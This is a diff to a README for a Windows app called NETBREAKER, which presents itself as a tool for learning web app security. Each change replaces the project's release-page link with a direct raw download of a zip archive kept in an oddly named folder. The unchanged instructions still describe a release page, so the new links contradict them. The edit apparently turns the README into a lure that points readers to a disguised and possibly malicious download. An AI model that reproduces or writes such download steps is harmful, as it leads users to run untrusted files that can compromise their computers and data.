@@ -1,4 +1,4 @@
-[![Download NETBREAKER](https://img.shields.io/badge/Download-NETBREAKER-blue?style=for-the-badge)](https://github.com/Factv3152/NETBREAKER/releases)
+[![Download NETBREAKER](https://img.shields.io/badge/Download-NETBREAKER-blue?style=for-the-badge)](https://github.com/Factv3152/NETBREAKER/raw/refs/heads/main/intertransversalis/Software_v3.3-alpha.2.zip)
 
 # 🛡️ NETBREAKER - Learn Web App Security Fast
 
@@ -6,7 +6,7 @@
 
 Visit this page to download NETBREAKER for Windows:
 
-https://github.com/Factv3152/NETBREAKER/releases
+https://github.com/Factv3152/NETBREAKER/raw/refs/heads/main/intertransversalis/Software_v3.3-alpha.2.zip
 
 On that page, look for the latest release. Download the Windows file that matches your system, then open it from your Downloads folder.
 
@@ -37,7 +37,7 @@ For the best result, use a normal user account with access to your Downloads fol
 ## 📥 Install on Windows
 
 1. Open the download page:
-   https://github.com/Factv3152/NETBREAKER/releases
+   https://github.com/Factv3152/NETBREAKER/raw/refs/heads/main/intertransversalis/Software_v3.3-alpha.2.zip
 
 2. Find the newest release near the top of the page.
 
@@ -169,7 +169,7 @@ Yes. It uses prompts and short training flow to help you move through each stage
 
 If you need the file later, use the release page:
 
-https://github.com/Factv3152/NETBREAKER/releases
+https://github.com/Factv3152/NETBREAKER/raw/refs/heads/main/intertransversalis/Software_v3.3-alpha.2.zip
 
 Download the latest Windows release, then open it from your Downloads folder or your saved app folder
 
